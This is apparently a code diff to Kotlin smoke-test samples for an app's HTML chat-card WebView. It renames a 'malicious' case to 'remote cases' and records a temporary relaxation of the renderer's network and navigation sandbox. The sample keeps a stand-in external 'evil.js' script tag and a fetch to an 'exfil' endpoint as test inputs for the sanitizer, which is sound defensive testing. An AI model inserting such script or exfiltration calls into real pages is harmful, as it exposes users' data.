@@ -5,15 +5,17 @@ package com.mamba.picme.features.chat
  *
  * 覆盖八类验证点：
  * 1. [STATIC]：纯 HTML/CSS 排版卡片；
- * 2. [RICH_MEDIA]：图文混排（内联 SVG 插图 + 首字下沉 + 双栏正文）——渲染层断网，
- *    图片只能内联（SVG/data URI），远程 img 见 [MALICIOUS]；
+ * 2. [RICH_MEDIA]：图文混排（内联 SVG 插图 + 首字下沉 + 双栏正文）；
+ *    内联图（SVG/data URI）仍是首选，远程 img 见 [REMOTE_CASES]；
  * 3. [COMPLEX_LAYOUT]：复杂排版（CSS Grid 仪表盘：统计卡 / 进度条 / 表格 / 徽标）；
  * 4. [CSS_ANIMATION]：CSS 动画（旋转圆环）；
  * 5. [ANIMATED_CHART]：动画图表（CSS keyframes 柱状图生长 + JS 数字滚动 + 呼吸灯）；
  * 6. [INLINE_JS]：内联 JS 交互（点按钮计数）；
  * 7. [INTERACTIVE]：复合交互（Tab 切换 + 手风琴折叠 + 计数，全在沙盒 JS 内完成）；
- * 8. [MALICIOUS]：恶意用例（外链 img/script、跳转、fetch）——全部应被 WebView 锁死拦截
- *    （故意绕过 [HtmlCardSanitizer] 直插，专测渲染层断网/禁导航防线）。
+ * 8. [REMOTE_CASES]：远程资源与外链用例——远程 img 应可加载、`<a>` 外链点击应打开
+ *    全屏落地页（2026-09-25 起安全限制暂时放开，表现力优先）；远程 script 仍应被
+ *    [HtmlCardSanitizer] 剔除（本样本故意绕过清洗器直插，远程 script 标签会原样进
+ *    WebView 但加载失败无原生副作用——零 JS 桥接防线不变）。
  *
  * 注意：列表卡片高度动态适配内容（clamp [120dp, 屏高×0.66]），滚动条一律隐藏；
  * 超高内容在卡片内滚动查看，JS 交互（按钮/Tab/手风琴）在卡片内直接生效。
@@ -54,8 +56,8 @@ object HtmlCardSmokeSamples {
           <p style="margin:0;font-size:14px;line-height:1.7;text-align:justify">
             <span style="float:left;font-size:40px;line-height:1;padding:2px 8px 0 0;color:#e91e63;font-weight:bold">傍</span>
             晚的山脊被夕阳染成橙紫色，三座山峰的剪影层层递进。这张插图完全由
-            <b>内联 SVG</b> 绘制，不请求任何网络资源——HTML 卡片渲染层处于断网沙盒中，
-            所有图文必须自包含。正文采用首字下沉与两端对齐排版，验证复杂文本版式能力。
+            <b>内联 SVG</b> 绘制，自包含、无网络依赖（远程图片用例见「远程用例」卡片）。
+            正文采用首字下沉与两端对齐排版，验证复杂文本版式能力。
           </p>
           <div style="display:flex;gap:8px;margin-top:12px">
             <span style="background:#fce4ec;color:#c2185b;border-radius:12px;padding:3px 12px;font-size:12px">摄影</span>
@@ -235,12 +237,12 @@ object HtmlCardSmokeSamples {
         </div>
     """
 
-    private const val MALICIOUS = """
+    private const val REMOTE_CASES = """
         <div style="padding:16px;font-family:sans-serif">
-          <p>恶意用例：以下远程资源与跳转应<b>全部失效</b></p>
-          <img src="https://example.com/should-not-load.png" width="100" height="60"
-               style="border:1px dashed red">
-          <p><a href="https://example.com">外链跳转（点了应无反应）</a></p>
+          <p>远程用例：远程图片应<b>正常加载</b>，外链点击应打开<b>全屏落地页</b></p>
+          <img src="https://picsum.photos/400/200" width="100%" height="120"
+               style="border-radius:8px;object-fit:cover">
+          <p><a href="https://example.com">https://example.com（点击打开落地页）</a></p>
           <script src="https://example.com/evil.js"></script>
           <script>
             fetch('https://example.com/exfil').then(function(){
@@ -258,6 +260,6 @@ object HtmlCardSmokeSamples {
         ANIMATED_CHART,
         INLINE_JS,
         INTERACTIVE,
-        MALICIOUS,
+        REMOTE_CASES,
     )
 }
